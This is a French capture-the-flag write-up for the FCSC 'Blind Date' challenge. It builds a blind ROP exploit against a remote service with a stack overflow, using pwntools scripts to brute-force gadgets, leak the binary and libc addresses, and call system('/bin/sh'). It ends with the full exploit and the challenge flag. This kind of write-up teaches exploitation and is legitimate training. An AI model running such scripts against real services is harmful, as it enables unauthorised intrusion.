# Blind Date - pwn

Énoncé : 
![énoncé](blind_date.png)

## Premières connexions au challenge
On se connecte au challenge : 
```
$ nc challenges2.france-cybersecurity-challenge.fr 4008
Hello you.
What is your name ?
>>> toto
Thanks toto
Bye!
```
Le programme est tout simple, il demande une entrée puis renvoie simplement cette entrée.
Tentons avec une entrée légèrement plus grande : 
```
$ python -c "print 'A'*200" | nc challenges2.france-cybersecurity-challenge.fr 4008
Hello you.
What is your name ?
>>> 
```
Le programme ne renvoie rien, il a sûrement planté et nous avons donc probablement affaire à un buffer overflow.
On a dù écraser le canary présent sur la stack ou la sauvegarde de EIP/RIP.
On réessaie avec un peu moins de 'A' jusqu'à trouver la limite à partir de laquelle le programme va planter : 
```
$ python -c "print 'A'*100" | nc challenges2.france-cybersecurity-challenge.fr 4008
Hello you.
What is your name ?
>>> 
$ python -c "print 'A'*50" | nc challenges2.france-cybersecurity-challenge.fr 4008
Hello you.
What is your name ?
>>> 
$ python -c "print 'A'*39" | nc challenges2.france-cybersecurity-challenge.fr 4008
Hello you.
What is your name ?
>>> Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@Bye!
$ python -c "print 'A'*40" | nc challenges2.france-cybersecurity-challenge.fr 4008
Hello you.
What is your name ?
>>>
```
À partir de 40 caractères envoyés, le programme ne renvoie plus rien.
On remarque également que lorsqu'on lui a envoyé 39 caractères, il a répondu `Thanks AAA[...]AAA @Bye!`, or ce `@` n'était pas présent les autres fois.
On envoie le tout dans `xxd` afin de comprendre un peu mieux ce que l'on a reçu :
```
$ python -c "print 'A'*39" | nc challenges2.france-cybersecurity-challenge.fr 4008 | xxd
00000000: 4865 6c6c 6f20 796f 752e 0a57 6861 7420  Hello you..What
00000010: 6973 2079 6f75 7220 6e61 6d65 203f 0a3e  is your name ?.>
00000020: 3e3e 2054 6861 6e6b 7320 4141 4141 4141  >> Thanks AAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000050: 410a cc06 4042 7965 210a                 A...@Bye!.
$ python -c "print 'A'*39" | nc challenges2.france-cybersecurity-challenge.fr 4008 | xxd
00000000: 4865 6c6c 6f20 796f 752e 0a57 6861 7420  Hello you..What
00000010: 6973 2079 6f75 7220 6e61 6d65 203f 0a3e  is your name ?.>
00000020: 3e3e 2054 6861 6e6b 7320 4141 4141 4141  >> Thanks AAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000050: 410a cc06 4042 7965 210a                 A...@Bye!.
```
Nous n'avons pas reçu qu'un seul `@` mais bien 3 bytes : `\xcc\x06\x40` ; qui ne changent pas, ne sont pas assez long pour être un canary et qui ressemblent étrangement à l'adresse d'une instruction/fonction dans un programme x86-64bits compilé sans PIE (Position Independent Executable), une protection qui randomise l'adresse à laquelle le binaire va être mappé en mémoire et donc les adresses des instructions et des fonctions de ce programme empêchant ainsi d'utiliser une ropchain sans avoir de leak.
En supposant donc que c'est un programme x86-64 compilé sans PIE et que les 3 bytes obtenus correspondent à la sauvegarde de RIP, on peut commencer à exploiter cette blind ROP.

## Premier essai : échec
J'ai commencé par chercher un stop gadget situé aux alentours de la sauvegarde de RIP, c'est-à-dire un gadget qui renvoie autre chose que ce qui est prévu initialement par le programme :
```py
from pwn import *

for rip in range(0x4006cc-0x100, 0x4006cc+0x100):
    print(".", end="", flush=True)
    r = remote("challenges2.france-cybersecurity-challenge.fr", 4008)

    r.recvuntil(">>> ")
    r.sendline(b"A"*40 + p64(rip))
    try:
        res = r.recvall(timeout=2)
    except:
        print(hex(rip))
        break
    if res != b"":
        print("\n" + hex(rip), res)
```
Après plusieurs dizaines de secondes, on trouve un certain nombre de gadgets mais dont beaucoup ne renvoie que `Thanks AAA[...]AAA` puis l'adresse du gadget.
J'ai donc choisi ce gadget : `0x400668 b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAh\x06@>>> '`
Maintenant que l'on a notre stop gadget on peut commencer à chercher des gadgets intéressants, comme un `pop rdi; ret` par exemple, afin de controller le premier argument de la fonction appelée.
J'ai cherché tous les potentiels `ret` pour commencer, puis à partir de ces adresses, si l'on soustrait 2 on devrait tomber sur un gadget du style `pop XXX, ret` car une instruction pop fait 2 bytes : 
```py
from pwn import *

stop_gadget = 0x400668

target = [] # nos potentiels ret
for rip in range(0x400000, 0x400000+0x1000):
    print(".", end="", flush=True)
    r = remote("challenges2.france-cybersecurity-challenge.fr", 4008)

    r.recvuntil(">>> ")
    r.sendline(b"A"*40 + p64(rip) + p64(stop_gadget))
    try:
        res = r.recvall(timeout=2)
    except:
        print(hex(rip))
        break
    if b">>> " in res:
        print("\n" + hex(rip), res)
        target.append(rip)
print(target)
```
Après plusieurs minutes, on obtient une liste assez longue de gadgets :
```
[4195792, 4195797, 4195798, 4195799, 4195805, 4195806, 4195809, 4195810, 4195812, 4195813, 4195815, 4195816, 4195819, 4195820, 4195822, 4195823, 4195825, 4195827, 4195845, 4195848, 4195849, 4195850, 4195851, 4195856, 4195863, 4195865, 4195866, 4195867, 4195869, 4195874, 4195875, 4195876, 4195881, 4195882, 4195883, 4195884, 4195888, 4195889, 4195893, 4195894, 4195897, 4195899, 4195900, 4195901, 4195904, 4195920, 4195921, 4195926, 4195927, 4195928, 4195930, 4195934, 4195939, 4195944, 4196017, 4196019, 4196020, 4196021, 4196022, 4196024, 4196029, 4196034, 4196039, 4196044, 4196049, 4196054, 4196059, 4196060, 4196061, 4196064, 4196065, 4196066, 4196067, 4196069, 4196070, 4196138, 4196143, 4196155, 4196162, 4196163, 4196164, 4196165, 4196166, 4196167, 4196168, 4196175, 4196176, 4196177, 4196180, 4196184, 4196188]
```
On soustrait 2 à chacun de ces gadgets et on peut espérer tombre sur un `pop XXX; ret`.
Maintenant que l'on a trouvé un moyen de contrôler un argument d'une fonction il faut trouver cette fonction qui nous intéresse.
Un `printf` ou un `puts` nous permettrait de lire la mémoire à une adresse quelconque et ainsi leaker tout le binaire afin que cette blind ROP se transforme en ROP.
```py
from pwn import *

stop_gadget = 0x400668

maybe_ret = [4195792, 4195797, 4195798, 4195799, 4195805, 4195806, 4195809, 4195810, 4195812, 4195813, 4195815, 4195816, 4195819, 4195820, 4195822, 4195823, 4195825, 4195827, 4195845, 4195848, 4195849, 4195850, 4195851, 4195856, 4195863, 4195865, 4195866, 4195867, 4195869, 4195874, 4195875, 4195876, 4195881, 4195882, 4195883, 4195884, 4195888, 4195889, 4195893, 4195894, 4195897, 4195899, 4195900, 4195901, 4195904, 4195920, 4195921, 4195926, 4195927, 4195928, 4195930, 4195934, 4195939, 4195944, 4196017, 4196019, 4196020, 4196021, 4196022, 4196024, 4196029, 4196034, 4196039, 4196044, 4196049, 4196054, 4196059, 4196060, 4196061, 4196064, 4196065, 4196066, 4196067, 4196069, 4196070, 4196138, 4196143, 4196155, 4196162, 4196163, 4196164, 4196165, 4196166, 4196167, 4196168, 4196175, 4196176, 4196177, 4196180, 4196184, 4196188]

for ret in maybe_ret:
    for rip in range(0x400700, 0x401200): # En prenant un autre binaire x86-64, j'ai supposé que l'adresse de la PLT se trouvait entre 0x400700 et 0x401200.
        print(".", end="", flush=True)
        r = remote("challenges2.france-cybersecurity-challenge.fr", 4008)

        r.recvuntil(">>> ")

        pld = b"A"*40
        pld += p64(ret-2) # pop XXX; ret
        pld += p64(0x400000) # adresse où est mappé le binaire en mémoire, on devrait donc y retrouver le magic number d'un ELF : "\x7fELF"
        pld += p64(rip)

        r.sendline(pld)
        try:
            res = r.recvall(timeout=2)
        except:
            print(hex(ret), hex(rip))
            break
        if b"\x7fELF" in res:
            print("\n" + hex(ret), hex(rip), res)
```
Comme le programme a mis beaucoup de temps et que la supposition de l'adresse de la PLT me semblait douteuse, j'ai décidé de recommencer à zéro.

## Deuxième tentative

![here_we_go_again](here_we_go_again.gif)

En regardant les différents stop gadgets obtenus auparavant, celui-ci m'a intrigué : `0x40066d b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAm\x06@\x84(\xad\xfb'`.
En effet, les derniers bytes retournés ne viennent pas de notre payload, c'est peut-être un `printf` ou un `puts` dont un argument pointe vers `\x84(\xad\xfb`.
On garde la même base que précédemment pour rechercher un `pop XXX; ret`, mais en rajoutant un peu de multi-threading (fortement inspiré par [https://www.youtube.com/watch?v=dQw4w9WgXcQ](https://www.youtube.com/watch?v=dQw4w9WgXcQ) :
```py
from pwn import *
import threading

# réelle inspiration pour le multi-threading :) : https://www.youtube.com/watch?v=OAk23u9b-88

print_gadget = 0x40066d

lock = threading.Lock()
it = iter(range(0x400000, 0x405000))

def get_next():
    with lock:
        res = next(it)
    return res

def find_stop_gadget():
    while True:
        addr = get_next()

        print(".", end="", flush=True)

        r = remote("challenges2.france-cybersecurity-challenge.fr", 4008)
        r.recvuntil(">>> ")

        pld = b"A"*40 + p64(addr)
        r.sendline(pld)

        res = r.recvall(timeout=2)
        if res and res != b"Thanks " + pld.replace(b"\x00", b"") + b"Bye!\n" and res != b"Thanks " + pld.replace(b"\x00", b""):
            print("\n" + hex(addr), res)

        r.close()
```
On obtient assez rapidement un résultat : `0x400743 b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC\x07@\x7fELF\x02\x01\x01'`
J'ai donc pu leaker le binaire en entier, et récupérer l'adresse de `main` puis l'adresse de `puts` dans la plt qui pointera à l'exécution du programme vers l'adresse de `puts` dans la libc.
Comme l'ASLR est activé, les adresses vers les fonctions de la libc seront différentes à chaque exécution, il faut donc trouver un moyen de ré-appeler `main`, un simple ret2main suffira : 
```py
pld = b"A"*40
pld += p64(saved_rip) # continuer le fonctionnement normal du programme, on ecrasera la 2e sauvegarde de RIP
pld += p64(0xdeadbeefcafebabe) # junk
pld += p64(addr_main)*3
```
Il faut maintenant leaker l'adresse de puts, en revanche, on ne peut pas leaker cette adresse de la même manière que l'on a leaké le binaire tout à l'heure car cela écraserait les sauvegardes de RIP vers main que l'on vient de placer, et nous ne pourront pas profiter de ce leak pour calculer l'adresse de `system`.
Mais si on se souvient bien, on a déjà réussi à avoir un leak au tout début du challenge : avec 39 `A`, le challenge nous retournait la valeur de la sauvegarde de RIP, mais il y a sûrement d'autres valeurs intéressantes : 
```
$ python -c "print 'A'*7" | nc challenges2.france-cybersecurity-challenge.fr 4008 | xxd
00000000: 4865 6c6c 6f20 796f 752e 0a57 6861 7420  Hello you..What
00000010: 6973 2079 6f75 7220 6e61 6d65 203f 0a3e  is your name ?.>
00000020: 3e3e 2054 6861 6e6b 7320 4141 4141 4141  >> Thanks AAAAAA
00000030: 410a 376a 285d fc7e 4279 6521 0a         A.7j(].~Bye!.
```
Avec 7 `A`, le challenge nous ressort 6 nouveaux bytes : `\x37\x6a\x28\x5d\xfc\x7e`.
En leakant l'adresse de `puts` (après un ret2main puis de la même manière avec laquelle nous avons leaké le binaire), il se trouve que :
```
puts = leak - 0xa7
```
On peut donc obtenir l'adressse d'une fonction de la libc avec ce leak.
Grâce à [ce site](https://libc.blukat.me/?q=_IO_printf%3A0x7fbc57249cf0%2C_IO_puts%3A0x7fbc57264990&l=libc6_2.19-18%2Bdeb8u10_amd64) (en utilisant des valeurs précédemment trouvée) on obtient les valeurs de décalage pour trouver l'adresse de `system` et l'adresse de `/bin/sh` dans la libc à partir de l'adresse de puts.
Ainsi : 
```
system = puts - 0x2a500
bin_sh = puts + 0xf7a58
```
Il suffira ainsi de :
```
pop_rdi + bin_sh + system
```
et nous obtiendrons notre tant attendu shell.
Voiçi l'exploit complet : 
```
from pwn import *
import threading

saved_rip = 0x4006cc

pop_gadget = 0x400743
pop_rdi = pop_gadget

print_gadget = 0x40066d

addr_main = 0x004006b4
addr_puts = 0x00600fc8

r = remote("challenges2.france-cybersecurity-challenge.fr", 4008)
r.recvuntil(">>> ")

# ret2main
pld = b"A"*40
pld += p64(saved_rip)
pld += p64(0xdeadbeefcafebabe) + p64(addr_main)*3

# leak avec 7 `A`
r.sendline(pld)
r.recvuntil(">>> ")
r.sendline("A"*7)
r.recv(7), r.recv(8)
puts = u64(r.recv(6) + b"\x00"*2) - 0xa7

# https://libc.blukat.me/?q=_IO_printf%3A0x7fbc57249cf0%2C_IO_puts%3A0x7fbc57264990&l=libc6_2.19-18%2Bdeb8u10_amd64
system = puts - 0x2a500
bin_sh = puts + 0xf7a58

print(f"puts @ {hex(puts)}")
print(f"system @ {hex(system)}")
print(f"bin_sh @ {hex(bin_sh)}")

r.recvuntil(">>> ")
r.sendline(b"A"*40 + p64(pop_rdi) + p64(bin_sh) + p64(system))

r.interactive()
```

# flag : `FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}`
